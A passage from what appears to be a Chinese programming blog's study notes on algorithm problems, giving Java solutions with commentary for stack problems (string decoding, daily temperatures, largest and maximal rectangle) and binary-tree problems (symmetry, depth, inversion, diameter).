  <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (stack1.pop().equals(stack2.peek()))&#123;<br>            stack2.pop();<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">top</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> stack1.peek();<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getMin</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> stack2.peek();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-3-字符串解码"><a href="#4-3-字符串解码" class="headerlink" title="4.3 字符串解码"></a>4.3 字符串解码</h2><ul><li><p>注意Character的内置方法判别数字和字母</p></li><li><p>LinkedList作为栈的好处是方便逆置</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span> ptr = <span class="hljs-number">0</span>;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">decodeString</span><span class="hljs-params">(String s)</span> </span>&#123;<br>    LinkedList&lt;String&gt; stack = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br>    StringBuilder sb = <span class="hljs-keyword">new</span> StringBuilder();<br>    <span class="hljs-keyword">while</span>(ptr &lt; s.length())&#123;<br>        <span class="hljs-keyword">char</span> cur = s.charAt(ptr);<br>        <span class="hljs-keyword">if</span>(Character.isDigit(cur))&#123;<br>            String digits = getDigits(s);<br>            stack.addLast(digits);<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(Character.isLetter(cur) || cur == <span class="hljs-string">&#x27;[&#x27;</span>)&#123;<br>            stack.addLast(String.valueOf(s.charAt(ptr++))); <br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            ++ptr;<br>            LinkedList&lt;String&gt; sub = <span class="hljs-keyword">new</span> LinkedList&lt;String&gt;();<br>            <span class="hljs-keyword">while</span> (!<span class="hljs-string">&quot;[&quot;</span>.equals(stack.peekLast())) &#123;<br>                sub.addLast(stack.removeLast());<br>            &#125;<br>            Collections.reverse(sub);<br>            <span class="hljs-comment">// 左括号出栈</span><br>            stack.removeLast();<br>            <span class="hljs-comment">// 此时栈顶为当前 sub 对应的字符串应该出现的次数</span><br>            <span class="hljs-keyword">int</span> repTime = Integer.parseInt(stack.removeLast());<br>            StringBuilder t = <span class="hljs-keyword">new</span> StringBuilder();<br>            String o = getString(sub);<br>            <span class="hljs-comment">// 构造字符串</span><br>            <span class="hljs-keyword">while</span> (repTime-- &gt; <span class="hljs-number">0</span>) &#123;<br>                t.append(o);<br>            &#125;<br>            <span class="hljs-comment">// 将构造好的字符串入栈</span><br>            stack.addLast(t.toString());<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> getString(stack);<br>&#125;<br><span class="hljs-function">String <span class="hljs-title">getDigits</span><span class="hljs-params">(String s)</span></span>&#123;<br>    StringBuilder nums = <span class="hljs-keyword">new</span> StringBuilder();<br>    <span class="hljs-keyword">while</span>(Character.isDigit(s.charAt(ptr)))&#123;<br>        nums.append(s.charAt(ptr++));<br>    &#125;<br>    <span class="hljs-keyword">return</span> nums.toString();<br>&#125;<br><span class="hljs-function">String <span class="hljs-title">getString</span><span class="hljs-params">(LinkedList&lt;String&gt; v)</span> </span>&#123;<br>    StringBuffer ret = <span class="hljs-keyword">new</span> StringBuffer();<br>    <span class="hljs-keyword">for</span> (String s : v) &#123;<br>        ret.append(s);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ret.toString();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-4-每日温度"><a href="#4-4-每日温度" class="headerlink" title="4.4 每日温度"></a>4.4 每日温度</h2><p>单调栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] dailyTemperatures(<span class="hljs-keyword">int</span>[] T) &#123;<br>    <span class="hljs-comment">//答案数组</span><br>    <span class="hljs-keyword">int</span>[] res = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[T.length];<br>    <span class="hljs-comment">//单调栈</span><br>    LinkedList&lt;Integer&gt; stack = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = T.length - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)&#123;<br>        <span class="hljs-keyword">while</span>( !stack.isEmpty() &amp;&amp; T[stack.peek()] &lt;= T[i])&#123;<br>            stack.pop();<br>        &#125;<br>        res[i] = stack.isEmpty() ? <span class="hljs-number">0</span> : (stack.peek() - i);<br>        stack.push(i);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-5-柱状图中最大矩形"><a href="#4-5-柱状图中最大矩形" class="headerlink" title="4.5 柱状图中最大矩形"></a>4.5 柱状图中最大矩形</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">largestRectangleArea</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] heights)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = heights.length;<br>    <span class="hljs-keyword">int</span>[] left = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n];<br>    <span class="hljs-keyword">int</span>[] right = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n];<br>    <br>    Stack&lt;Integer&gt; mono_stack = <span class="hljs-keyword">new</span> Stack&lt;Integer&gt;();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; ++i) &#123;<br>        <span class="hljs-keyword">while</span> (!mono_stack.isEmpty() &amp;&amp; heights[mono_stack.peek()] &gt;= heights[i]) &#123;<br>            mono_stack.pop();<br>        &#125;<br>        left[i] = (mono_stack.isEmpty() ? -<span class="hljs-number">1</span> : mono_stack.peek());<br>        mono_stack.push(i);<br>    &#125;<br><br>    mono_stack.clear();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = n - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; --i) &#123;<br>        <span class="hljs-keyword">while</span> (!mono_stack.isEmpty() &amp;&amp; heights[mono_stack.peek()] &gt;= heights[i]) &#123;<br>            mono_stack.pop();<br>        &#125;<br>        right[i] = (mono_stack.isEmpty() ? n : mono_stack.peek());<br>        mono_stack.push(i);<br>    &#125;<br>    <br>    <span class="hljs-keyword">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; ++i) &#123;<br>        ans = Math.max(ans, (right[i] - left[i] - <span class="hljs-number">1</span>) * heights[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-6-最大矩形"><a href="#4-6-最大矩形" class="headerlink" title="4.6 最大矩形"></a>4.6 最大矩形</h2><p>先转化成求柱状图中最大矩形问题。</p><p>我们首先计算出矩阵的每个元素的左边连续 1的数量，使用二维数组$ \textit{left}$ 记录，其中 $\textit{left}[i][j]$ 为矩阵第 i 行第 j 列元素的左边连续 1 的数量。</p><p>具体而言，当考察以 $\textit{matrix}[i][j]$ 为右下角的矩形时，我们枚举满足 $0 \le k \le i$ 的所有可能的 k，此时矩阵的最大宽度就为</p><script type="math/tex; mode=display">\textit{left}[i][j], \textit{left}[i-1][j], \ldots, \textit{left}[k][j]</script><p>的最小值。</p><p>对每一列：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/最大矩形3.png" alt="最大矩形3" style="zoom: 33%;" /></p><p>转化成了柱状图中最大矩形问题。</p><p>枚举每一列得到答案。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">maximalRectangle</span><span class="hljs-params">(<span class="hljs-keyword">char</span>[][] matrix)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> m = matrix.length;<br>        <span class="hljs-keyword">if</span> (m == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">int</span> n = matrix[<span class="hljs-number">0</span>].length;<br>        <span class="hljs-keyword">int</span>[][] left = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[m][n];<br><br>        <span class="hljs-comment">//形成柱状图</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>                <span class="hljs-keyword">if</span> (matrix[i][j] == <span class="hljs-string">&#x27;1&#x27;</span>) &#123;<br>                    left[i][j] = (j == <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : left[i][j - <span class="hljs-number">1</span>]) + <span class="hljs-number">1</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123; <span class="hljs-comment">// 对于每一列，使用基于柱状图的方法</span><br>            <span class="hljs-keyword">int</span>[] up = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[m];<br>            <span class="hljs-keyword">int</span>[] down = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[m];<br><br>            Deque&lt;Integer&gt; stack = <span class="hljs-keyword">new</span> LinkedList&lt;Integer&gt;();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>                <span class="hljs-keyword">while</span> (!stack.isEmpty() &amp;&amp; left[stack.peek()][j] &gt;= left[i][j]) &#123;<br>                    stack.pop();<br>                &#125;<br>                up[i] = stack.isEmpty() ? -<span class="hljs-number">1</span> : stack.peek();<br>                stack.push(i);<br>            &#125;<br>            stack.clear();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = m - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>                <span class="hljs-keyword">while</span> (!stack.isEmpty() &amp;&amp; left[stack.peek()][j] &gt;= left[i][j]) &#123;<br>                    stack.pop();<br>                &#125;<br>                down[i] = stack.isEmpty() ? m : stack.peek();<br>                stack.push(i);<br>            &#125;<br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>                <span class="hljs-keyword">int</span> height = down[i] - up[i] - <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">int</span> area = height * left[i][j];<br>                ret = Math.max(ret, area);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="5-树"><a href="#5-树" class="headerlink" title="5. 树"></a>5. 树</h1><p>普通二叉树解题基本都离不开各种遍历方法，掌握好遍历方法是做好二叉树的关键。</p><p>二叉搜索树的技巧在于利用其自身的特性，如果当前节点会对下面子节点有整体影响，可以通过辅助函数增长参数列表，借助参数传递信息。</p><h2 id="5-1-对称二叉树"><a href="#5-1-对称二叉树" class="headerlink" title="5.1 对称二叉树"></a>5.1 对称二叉树</h2><p>递归解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isSymmetric</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>    <span class="hljs-comment">//前序遍历</span><br><span class="hljs-keyword">return</span> root == <span class="hljs-keyword">null</span> || recur(root.left,root.right);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">recur</span><span class="hljs-params">(TreeNode left, TreeNode right)</span></span>&#123;<br>    <span class="hljs-comment">//递归出口</span><br>    <span class="hljs-keyword">if</span>(left == <span class="hljs-keyword">null</span> &amp;&amp; right == <span class="hljs-keyword">null</span>)&#123;<br>   <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(left == <span class="hljs-keyword">null</span> || right == <span class="hljs-keyword">null</span> || left.val != right.val)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>    &#125;<br>    <br><span class="hljs-keyword">return</span> recur(left.left,right.right) &amp;&amp; recur(left.right,right.left);<br>&#125;<br></code></pre></td></tr></table></figure><p>迭代解法：</p><p>二叉树的算法通常与遍历有关，无法使用递归的遍历方法情况下，有层序遍历和非递归的前序中序后序的遍历方法。</p><p>层序遍历借助队列实现，在本题中可以一个正常层序遍历，一个倒序层序遍历（构建原来树的镜像树）进行比较</p><p>实现队列插入时发现不需要判空，jdk文档的说明：</p><blockquote><p><code>Queue</code> 实现通常不允许插入 <code>null</code> 元素，尽管某些实现（如 <a href="https://tool.oschina.net/uploads/apidocs/jdk-zh/java/util/LinkedList.html"><code>LinkedList</code></a>）并不禁止插入 <code>null</code>。即使在允许 null 的实现中，也不应该将 <code>null</code> 插入到 <code>Queue</code> 中，因为 <code>null</code> 也用作 <code>poll</code> 方法的一个特殊返回值，表明队列不包含元素。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isSymmetric</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;    <br>        Queue&lt;TreeNode&gt; queue = <span class="hljs-keyword">new</span> LinkedList&lt;TreeNode&gt;();<br>        queue.offer(root);<br>        queue.offer(root);<br>        <span class="hljs-keyword">while</span>(!queue.isEmpty())&#123;<br>          TreeNode tmp1 = queue.poll();<br>          TreeNode tmp2 = queue.poll();<br>          <span class="hljs-keyword">if</span>(tmp1 == <span class="hljs-keyword">null</span> &amp;&amp; tmp2 == <span class="hljs-keyword">null</span>)&#123;<br>              <span class="hljs-keyword">continue</span>;<br>          &#125;<br>          <span class="hljs-keyword">if</span>(tmp1 == <span class="hljs-keyword">null</span> || tmp2 == <span class="hljs-keyword">null</span> || tmp1.val != tmp2.val)&#123;<br>              <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>          &#125;<br>        <span class="hljs-comment">//不需要判空，因为queue的linkedlist允许null</span><br>        queue.add(tmp1.left);<br>        queue.add(tmp2.right);<br>          <br>        queue.add(tmp1.right);<br>        queue.add(tmp2.left);        <br>        &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可不可以不借助队列比较，不去构建镜像比较，将每层直接在原树上借助栈比较，这样有下面的问题</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-number">1</span><br>  / <span class="hljs-string">\</span><br> <span class="hljs-number">2</span>   <span class="hljs-number">2</span><br>  <span class="hljs-string">\</span>   <span class="hljs-string">\</span><br>  <span class="hljs-number">3</span>    <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>所以入栈时对于子节点不全为null的树节点，将其空子节点置为-1方便比较。而且也需要借助队列，空间复杂度没有得到优化。</p><p>既然可以借助层序遍历，那可不可以借助非递归前序遍历</p><p>应该是不可以的，前序遍历的非递归代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isSymmetric</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>        ArrayList&lt;Integer&gt; results = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>    Stack&lt;TreeNode&gt; stack = <span class="hljs-keyword">new</span> Stack&lt;&gt;();<br><br>        TreeNode cur = root;<br>        <span class="hljs-keyword">while</span> (cur != <span class="hljs-keyword">null</span> || !stack.empty()) &#123;<br>            <span class="hljs-keyword">while</span> (cur != <span class="hljs-keyword">null</span>) &#123;<br>                results.add(cur.val);<br>                stack.push(cur);<br>                cur = cur.left;<br>            &#125;<br>            cur = stack.pop();<br>            <span class="hljs-comment">// 转向</span><br>            cur = cur.right;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> results;<br>    &#125;<br></code></pre></td></tr></table></figure><p>因为题目要判定对称二叉树，递归可以使得左右同步的进行，所以可以比较，而非递归的遍历方式是一步步的将左子树走完再去走右子树。</p><h2 id="5-2-二叉树最大深度"><a href="#5-2-二叉树最大深度" class="headerlink" title="5.2 二叉树最大深度"></a>5.2 二叉树最大深度</h2><p>递归法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">maxDepth</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> + Math.max(maxDepth(root.left),maxDepth(root.right));<br>&#125;<br></code></pre></td></tr></table></figure><p>迭代法：</p><p>使用迭代的方法其实就是记录分支里面最深的深度，参考层序遍历时将每层打印的方法，每记录一层加1可以得到二叉树最大深度：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">maxDepth</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        Queue&lt;TreeNode&gt; queue = <span class="hljs-keyword">new</span> LinkedList&lt;TreeNode&gt;();<br>        queue.add(root);<br>        <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span>(!queue.isEmpty())&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = queue.size();i &gt; <span class="hljs-number">0</span>;i--)&#123;<br>                TreeNode tmp = queue.poll();<br>                <span class="hljs-keyword">if</span>(tmp.left != <span class="hljs-keyword">null</span>)&#123;<br>                    queue.add(tmp.left);<br>                &#125;<br>                <span class="hljs-keyword">if</span>(tmp.right != <span class="hljs-keyword">null</span>)&#123;<br>                    queue.add(tmp.right);<br>                &#125;<br>            &#125;<br>            res++;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="5-3-翻转二叉树"><a href="#5-3-翻转二叉树" class="headerlink" title="5.3 翻转二叉树"></a>5.3 翻转二叉树</h2><p>递归法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> TreeNode <span class="hljs-title">invertTree</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>    <span class="hljs-comment">//递归出口</span><br>    <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>    TreeNode tmp = root.left;<br>    <span class="hljs-comment">//前序遍历将每个节点反转</span><br>    root.left = invertTree(root.right);<br>    root.right = invertTree(tmp);<br><span class="hljs-keyword">return</span> root;<br>&#125;<br></code></pre></td></tr></table></figure><p>也可以层序遍历将每个节点翻转</p><p>迭代法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> TreeNode <span class="hljs-title">invertTree</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>        Queue&lt;TreeNode&gt; queue = <span class="hljs-keyword">new</span> LinkedList&lt;TreeNode&gt;();<br>        <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>        queue.add(root);<br>        <span class="hljs-keyword">while</span>(!queue.isEmpty())&#123;<br>            TreeNode tmp = queue.poll();<br>            TreeNode node = tmp.left;<br>            tmp.left = tmp.right;<br>            tmp.right = node;<br>            <span class="hljs-keyword">if</span>(tmp.left != <span class="hljs-keyword">null</span>)&#123;<br>                queue.add(tmp.left);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(tmp.right != <span class="hljs-keyword">null</span>)&#123;<br>                queue.add(tmp.right);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="5-4-二叉树的直径"><a href="#5-4-二叉树的直径" class="headerlink" title="5.4 二叉树的直径"></a>5.4 二叉树的直径</h2><p>实质为求左右子树深度和的最大值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span> max;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">diameterOfBinaryTree</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    maxDepth(root);<br>    <span class="hljs-keyword">return</span> max;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxDepth</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">int</span> leftDepth = maxDepth(root.left);<br>    <span class="hljs-keyword">int</span> rightDepth = maxDepth(root.right);<br>    max = Math.max(max,leftDepth + rightDepth);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> + Math.max(leftDepth,rightDepth);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-5-合并二叉树"><a href="#5-5-合并二叉树" class="headerlink" title="5.5 合并二叉树"></a>5.5 合并二叉树</h2><p>递归法：</p><p>前序递归的合并每一个子树</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 